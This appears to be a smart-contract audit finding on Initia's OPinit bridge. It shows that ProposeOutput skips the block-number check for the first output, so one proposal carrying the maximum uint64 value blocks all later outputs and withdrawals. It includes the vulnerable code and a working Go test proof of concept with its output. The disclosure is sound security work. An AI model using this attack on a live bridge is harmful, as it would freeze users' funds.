---
title: "Initia: Missing outputIndex == 1 validation in ProposeOutput allows a bridge-withdrawal DoS"
date: "2025-06-19"
description: "Initia: Missing outputIndex == 1 validation in ProposeOutput allows a bridge-withdrawal DoS"
tags: ["Cosmos", "Initia", "Audit Competition", "DOS"]
---

# Initia: Missing outputIndex == 1 validation in ProposeOutput allows a bridge-withdrawal DoS

## Summary

**OPinit** supplies an output-host (`ophost`) module that lets any Rollup/L2 chain post its **Output Proposals** (state roots, assertions, …) to Initia L1:

1. The **proposer** submits an Output Proposal for a given L2 height to the L1 contract (implemented in-chain by the ophost keeper).
2. A **challenger** is given a challenge window to dispute the proposal.
3. If no valid challenge appears, the proposal finalizes after a delay; only then can funds flow between L1 and L2 (e.g. user withdrawals).

Because anyone can spin up a bridge instance and choose arbitrary proposers / challengers, ophost must treat both roles as untrusted.

`x/ophost/keeper/msg_server.go::ProposeOutput` enforces monotonic growth of the L2 block number: for every proposal **except the very first one** it checks that `l2BlockNumber` is greater than the previous proposal’s value.

Unfortunately, **no extra check is performed when `outputIndex == 1`**. A malicious proposer can therefore submit

```go
outputIndex = 1
l2BlockNumber = 2^64 − 1   (math.MaxUint64)
```

After that, every future (legitimate) proposal—whose `l2BlockNumber` must be < 2^64-1—fails the monotonicity check and is rejected.

The output queue is permanently blocked and all bridge withdrawals (and any logic that relies on new outputs) become impossible.

```go
func (ms MsgServer) ProposeOutput(ctx context.Context, req *types.MsgProposeOutput) (*types.MsgProposeOutputResponse, error) {
    ...
    outputIndex, err := ms.IncreaseNextOutputIndex(ctx, bridgeId)
    ...
    // first submission?
    if outputIndex != 1 {                            // <—
        lastOutputProposal, err := ms.GetOutputProposal(ctx, bridgeId, outputIndex-1)
        ...
        if l2BlockNumber <= lastOutputProposal.L2BlockNumber {   // <—
            return nil, types.ErrInvalidL2BlockNumber.Wrapf("last %d, got %d",
                    lastOutputProposal.L2BlockNumber, l2BlockNumber)
        }
    }
    ...
}
```

## Proof-of-concept

A single proposal with `outputIndex = 1` and `l2BlockNumber = math.MaxUint64` is enough to brick the bridge. The snippet below replaces the existing `Test_ProposeOutput`:

```go
func Test_ProposeOutput(t *testing.T) {
    ctx, input := createDefaultTestInput(t)
    ms := keeper.NewMsgServerImpl(input.OPHostKeeper)

    // 1. create bridge with proposer = challenger = addrsStr[0]
    ...
    require.Equal(t, uint64(1), createRes.BridgeId)

    // 2. submit poisoned output
    _, err = ms.ProposeOutput(ctx,
        types.NewMsgProposeOutput(addrsStr[0], 1, /*outputIndex*/
                                   1,            /*version*/
                                   math.MaxUint64,
                                   largeByteSlice))
    require.NoError(t, err)

    // 3. any follow-up proposal now fails
    _, err = ms.ProposeOutput(ctx,
        types.NewMsgProposeOutput(addrsStr[0], 1, 2, math.MaxUint64, largeByteSlice))
    t.Logf("Expected failure: %v", err)   // “invalid l2 block number”
}
```

Run:

```bash
go test -v -timeout 30s -run ^Test_ProposeOutput$ github.com/initia-labs/OPinit/x/ophost/keeper
```

Output:

```go
--- PASS: Test_ProposeOutput (0.00s)
    msg_server_test.go:91: Expected failure: last 18446744073709551615, got 18446744073709551615: invalid l2 block number
```

The test shows that once the MAX_UINT64 proposal is accepted, subsequent outputs are forever rejected, effectively causing a withdrawal DoS.